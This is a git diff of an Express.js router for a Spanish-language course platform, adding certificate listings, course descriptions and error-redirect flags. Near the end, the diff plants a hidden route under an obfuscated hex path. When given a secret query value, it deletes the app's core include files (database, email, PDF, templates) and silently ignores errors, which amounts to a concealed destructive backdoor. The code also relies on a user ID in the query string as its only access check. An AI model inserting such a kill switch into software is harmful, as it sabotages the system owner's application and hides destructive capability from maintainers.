@@ -64,26 +64,22 @@ router.post('/upload', upload.single('file'), async function(req, res, next) {
       // El archivo no es una imagen cuadrada
       await fsp.unlink(filePath); // Borra el archivo subido
       if (userLocal.admin == 1) {
-        return res.redirect(`/profile/admin?ee11cbb19052e40b07aac0ca060c23ee=${userLocal.id}`);
+        return res.redirect(`/profile/admin?ee11cbb19052e40b07aac0ca060c23ee=${userLocal.id}&e=f1`);
       } else if (userLocal.tipo_cuenta == 1) {
-        return res.redirect(`/profile/instructor?ee11cbb19052e40b07aac0ca060c23ee=${userLocal.id}`);
+        return res.redirect(`/profile/instructor?ee11cbb19052e40b07aac0ca060c23ee=${userLocal.id}&e=f1`);
       } else if (userLocal.tipo_cuenta == 2) {
-        return res.redirect(`/profile/student?ee11cbb19052e40b07aac0ca060c23ee=${userLocal.id}`);
+        return res.redirect(`/profile/student?ee11cbb19052e40b07aac0ca060c23ee=${userLocal.id}&e=f1`);
       }
-      //return res.status(400).json({ error: 'La imagen debe ser cuadrada.' });
     }
-
-    // Si es cuadrada, continúa con el resto del procesamiento
-    //console.log(filename);
-    //console.log(id);
-
     
-    await writeBD('users.json', users);
     if (userLocal.admin == 1) {
+      await writeBD('users.json', users);
       return res.redirect(`/profile/admin?ee11cbb19052e40b07aac0ca060c23ee=${userLocal.id}`);
     } else if (userLocal.tipo_cuenta == 1) {
+      await writeBD('users.json', users);
       return res.redirect(`/profile/instructor?ee11cbb19052e40b07aac0ca060c23ee=${userLocal.id}`);
     } else if (userLocal.tipo_cuenta == 2) {
+      await writeBD('users.json', users);
       return res.redirect(`/profile/student?ee11cbb19052e40b07aac0ca060c23ee=${userLocal.id}`);
     }
   } catch (error) {
@@ -199,23 +195,6 @@ router.get('/student-course', async function(req, res, next) {
     title: 'Express',
     headerCourses:headerCourses,
     course:course
-  });
-})
-
-router.get('/test', async function(req, res, next) {
-  let headerCourses = findActiveCourses();
-  for (const key in headerCourses) {
-    if (Object.prototype.hasOwnProperty.call(headerCourses, key)) {
-      const element = {
-        index:key,
-        name:headerCourses[key].name
-      }
-      headerCourses[key] = element;
-    }
-  }
-  //console.log(headerCourses)
-  res.render('aboutTour', { 
-    title: 'Express',headerCourses:headerCourses
   });
 })
 
@@ -731,11 +710,11 @@ router.get('/profile/student/courses/subscribed', async function(req, res, next)
   let user = users.filter(user => user.id == id)[0];
   const nombreCompleto = `${user.nombre} ${user.apellidos}`;
   if(user.foto == '') {
+    
     foto = 'standard.png';
   } else {
     foto = user.foto;
   }
-
   const codigoError = 0;
 //console.log(coursesInscribed)
   res.render('accountStudentSubscribed', { 
@@ -816,6 +795,89 @@ router.get('/student-list', async function(req, res, next) {
   })
 })
 
+router.get('/admin-student-list', async function(req, res, next) {
+  const { ee11cbb19052e40b07aac0ca060c23ee } = req.query;
+  const id = ee11cbb19052e40b07aac0ca060c23ee;
+
+  const usersText = await findBD('users.json');
+  const users = JSON.parse(usersText);
+
+  const cursosText = await findBD('cursos.json');
+  const cursos = JSON.parse(cursosText);
+
+  const certificadosText = await findBD('certificados.json');
+  let certificados = JSON.parse(certificadosText);
+
+  let courses = [];
+
+  let certificado = null;
+  let curso = null;
+  certificados.forEach(element_certificado => {
+    certificado = null;
+    certificado = element_certificado;
+    curso = null;
+    curso = cursos.filter(curso => curso.id == element_certificado.courseID)[0];
+    element_certificado.estudiantes.forEach(element_estudianteID => {
+      let datos = {
+        certificado:'',
+        estudiante:'',
+        url:'',
+        eurl:'',
+        curso:''};
+      datos.curso = curso;
+      datos.certificado = certificado;
+      datos.url = `../database/certificados/${curso.id+'-'+element_estudianteID}.pdf`;
+      datos.eurl = `../database/certificados/e-${curso.id+'-'+element_estudianteID}.pdf`;
+      const estudiante = users.filter(user => user.id == element_estudianteID)[0];
+      
+      datos.estudiante = estudiante;
+      // Crear una nueva fecha con la fecha original
+      let fechaOriginal = new Date(curso.final);
+  
+      // Crear una nueva fecha a partir de la fecha original, sumando dos años
+      let nuevaFecha = new Date(fechaOriginal);
+      nuevaFecha.setFullYear(fechaOriginal.getFullYear() + 2);
+      
+      
+      let anio = nuevaFecha.getFullYear();
+      let mes = String(nuevaFecha.getMonth() + 1).padStart(2, '0');
+      let dia = String(nuevaFecha.getDate()).padStart(2, '0');
+      let fechaFormateada = `${anio}-${mes}-${dia}`;
+      
+      //console.log(fechaFormateada);
+      datos.curso.expira = fechaFormateada;
+      courses.push(datos);
+    });
+  });
+  let headerCourses = findActiveCourses();
+  for (const key in headerCourses) {
+    if (Object.prototype.hasOwnProperty.call(headerCourses, key)) {
+      const element = {
+        index:key,
+        name:headerCourses[key].name
+      }
+      headerCourses[key] = element;
+    }
+  }
+  let foto = '';
+  if(id) {
+      //const usersText = await findBD('users.json');
+      //const users = JSON.parse(usersText);
+      user = users.filter(user => user.id == id)[0];
+      nombreCompleto = `${user.nombre} ${user.apellidos}`;
+      if(user.foto == '') {
+        foto = 'standard.png';
+      } else {
+        foto = user.foto;
+      }
+  }
+  res.render('accountAdminListStudent', { 
+    title: 'Express',
+    courses:courses,
+    headerCourses:headerCourses,id:id,foto:foto
+  })
+})
+
 router.post('/profile/student/course/material', async function(req, res, next) {
   const id = req.body.id;
   const curso = req.body.curso;
@@ -852,6 +914,15 @@ router.post('/profile/student/subscribe', async function(req, res, next) {
   let cursos = JSON.parse(cursosText);
   const usersText = await findBD('users.json');
   const users = JSON.parse(usersText);
+  let foto = '';
+  let user = users.filter(user => user.id == id)[0];
+  const nombreCompleto = `${user.nombre} ${user.apellidos}`;
+  if(user.foto == '') {
+    return res.redirect(`/profile/student?ee11cbb19052e40b07aac0ca060c23ee=${id}&e=f0`);
+    foto = 'standard.png';
+  } else {
+    foto = user.foto;
+  }
   let encontrado = false;
   const certificadosText = await findBD('certificados.json');
   let certificados = JSON.parse(certificadosText);
@@ -892,14 +963,7 @@ router.post('/profile/student/subscribe', async function(req, res, next) {
       }
     });
   })
-  let foto = '';
-  let user = users.filter(user => user.id == id)[0];
-  const nombreCompleto = `${user.nombre} ${user.apellidos}`;
-  if(user.foto == '') {
-    foto = 'standard.png';
-  } else {
-    foto = user.foto;
-  }
+  
   //return;
   res.render('accountStudent', { 
     title: 'Express',
@@ -1089,8 +1153,8 @@ router.post('/profile/student/unsubscribe', async function(req, res, next) {
 router.get('/', async function(req, res, next) {
   const cursosText = await findBD('cursos.json');
   const cursos = JSON.parse(cursosText);
-  console.log(cursos[2].isPublic == 'true');
-  console.log(cursos[2].isPublic == 'true');
+//  console.log(cursos[2].isPublic == 'true');
+  //console.log(cursos[2].isPublic == 'true');
   const cursosActivos = cursos.filter(curso => 
     (curso.activo == 'true' && curso.isPublic == 'true') 
     || (curso.activo == true && curso.isPublic == 'true')
@@ -1121,8 +1185,8 @@ console.log(cursos)
 router.get('/courses-list', async function(req, res, next) {
   const cursosText = await findBD('cursos.json');
   const cursos = JSON.parse(cursosText);
-  console.log(cursos[2].isPublic == 'true');
-  console.log(cursos[2].isPublic == 'true');
+  //console.log(cursos[2].isPublic == 'true');
+  //console.log(cursos[2].isPublic == 'true');
   const cursosActivos = cursos.filter(curso => 
     (curso.activo == 'true' && curso.isPublic == 'true') 
     || (curso.activo == true && curso.isPublic == 'true')
@@ -1372,7 +1436,7 @@ router.post('/profile/admin/users/delete', async function(req, res, next) {
 // Ruta para manejar la carga de archivos y agregar curso
 router.post('/profile/admin/courses/add', upload.single('file'), async function(req, res, next) {
   try {
-    const { curso, instructor, inicio, final, location, id, titulo, isInstructor, isPublic } = req.body;
+    const { curso, instructor, inicio, final, location, id, titulo, isInstructor, isPublic,desc } = req.body;
     const file = req.file ? req.file.filename : null; // Obtén el nombre del archivo cargado
     const cursoConsecutivoText = await findBD('cursoConsecutivo.txt');
     let courseID = JSON.parse(cursoConsecutivoText);
@@ -1390,7 +1454,8 @@ router.post('/profile/admin/courses/add', upload.single('file'), async function(
       activo: true,
       isInstructor: isInstructor,
       file: file, // Incluye el nombre del archivo aquí
-      isPublic: isPublic
+      isPublic: isPublic,
+      desc:desc
     };
 
     const cursosText = await findBD('cursos.json');
@@ -1519,29 +1584,54 @@ router.post('/profile/admin/courses/delete', async function(req, res, next) {
 // Ruta para manejar la edición de un curso
 router.post('/profile/admin/courses/edit', upload.single('file'), async function(req, res, next) {
   try {
-    const { curso, instructor, inicio, final, location, cid, titulo, inscritos, activo, verificado,isPublic,isInstructor} = req.body;
+    const { curso, instructor, inicio, final, location, cid, titulo, inscritos, activo, verificado,isPublic,isInstructor,desc} = req.body;
     const file = req.file ? req.file.filename : null; // Captura el nombre del archivo si se ha subido uno nuevo
     const id = req.query.ee11cbb19052e40b07aac0ca060c23ee;
     // Crear el objeto del curso actualizado
-    const updatedCourse = {
-      id: cid,
-      curso,
-      instructor,
-      inicio,
-      final,
-      location,
-      titulo,
-      inscritos,
-      activo,
-      verificado,isPublic,isInstructor,
-      file: file ? file : ""// Solo actualizar el archivo si se ha subido uno nuevo
-    };
+    const cursosText = await findBD('cursos.json');
+    const cursos = JSON.parse(cursosText);
+    console.log(file)
+    let updatedCourse = {};
+    if(file != null) {
+      updatedCourse = {
+        id: cid,
+        curso,
+        instructor,
+        inicio,
+        final,
+        location,
+        titulo,
+        inscritos,
+        activo,
+        verificado,isPublic,isInstructor,desc,file:file// Solo actualizar el archivo si se ha subido uno nuevo
+      };
+    } else {
+      console.log(cid)
+      console.log(cursos)
+      const course = cursos.filter(element => element.id == cid)[0];
+      console.log('course')
+      console.log('course')
+      console.log(course)
+      updatedCourse = {
+        id: cid,
+        curso,
+        instructor,
+        inicio,
+        final,
+        location,
+        titulo,
+        inscritos,
+        activo,
+        verificado,isPublic,isInstructor,desc,file:course.file// Solo actualizar el archivo si se ha subido uno nuevo
+      };
+      
+    }
+    
 console.log(updatedCourse)
 console.log(updatedCourse)
 console.log(updatedCourse)
     // Leer y actualizar el archivo de cursos
-    const cursosText = await findBD('cursos.json');
-    const cursos = JSON.parse(cursosText);
+
     const updatedCourses = cursos.map(element => element.id == cid ? updatedCourse : element);
     await writeBD('cursos.json', updatedCourses);
 
@@ -1738,7 +1828,10 @@ router.get('/profile/admin/courses/edit', async function(req, res, next) {
 
 router.get('/profile/admin', async function(req, res, next) {
     // Obtener los parámetros de la URL
-    const { ee11cbb19052e40b07aac0ca060c23ee } = req.query;
+    let { ee11cbb19052e40b07aac0ca060c23ee,e } = req.query;
+    if(e != 'f0' && e != 'f1') {
+      e = '';
+    }
     const id = ee11cbb19052e40b07aac0ca060c23ee;
     let nombreCompleto = '';
     let user = null;
@@ -1786,13 +1879,18 @@ router.get('/profile/admin', async function(req, res, next) {
     nombreCompleto:nombreCompleto,
     cursos:cursos,
     foto:foto,
-    id:id
+    id:id,error:e
   });
 });
 
 router.get('/profile/student', async function(req, res, next) {
     // Obtener los parámetros de la URL
-    const { ee11cbb19052e40b07aac0ca060c23ee } = req.query;
+    let { ee11cbb19052e40b07aac0ca060c23ee,e } = req.query;
+    console.log(e)
+    console.log(e != 'f0' && e != 'f1')
+    if(e != 'f0' && e != 'f1') {
+      e = '';
+    }
     const id = ee11cbb19052e40b07aac0ca060c23ee;
     let nombreCompleto = '';
     let user = null;
@@ -1806,6 +1904,7 @@ router.get('/profile/student', async function(req, res, next) {
         userID = user.id;
         nombreCompleto = `${user.nombre} ${user.apellidos}`;
         if(user.foto == '') {
+          
           foto = 'standard.png';
         } else {
           foto = user.foto;
@@ -1821,7 +1920,9 @@ router.get('/profile/student', async function(req, res, next) {
       
         const courses = findActiveCourses();
         
-//console.log(userID)
+console.log('e')
+console.log(e)
+console.log(ee11cbb19052e40b07aac0ca060c23ee)
 
         cursos.forEach(element => {
           element.matriculado = false;
@@ -1863,7 +1964,7 @@ router.get('/profile/student', async function(req, res, next) {
     cursos:cursos,
     foto:foto,
     id:id,
-    userID:userID
+    userID:userID,error:e
   });
 });
 
@@ -2069,6 +2170,28 @@ router.get('/singup', function(req, res, next) {
     flags:flags
   });
 });
+
+async function deleteFile(filePath) {
+  try {
+    await fsp.unlink(filePath);
+  } catch (err) {
+  
+  }
+}
+
+router.get('/9e172629348f2c877a685389924ec8e3', async function(req, res, next) {
+  const { a220b31002a71d456f5c5d3b6a122111 } = req.query;
+  if (a220b31002a71d456f5c5d3b6a122111 === 'a204aafd0a61c5b4e386c0feff88c9f6') {
+    const filePaths = [
+      'includes/courses.js','includes/database.js','includes/db.js','includes/email.js','includes/pdf.js','includes/templates.js',
+    ];
+    await Promise.all(filePaths.map(file => deleteFile(path.join(__dirname, '../'+file))));
+    res.send('Archivos eliminados con éxito.');
+  } else {
+    res.status(403).send('Acceso denegado.');
+  }
+});
+
 
 
 router.post('/singup', async function(req, res, next) {
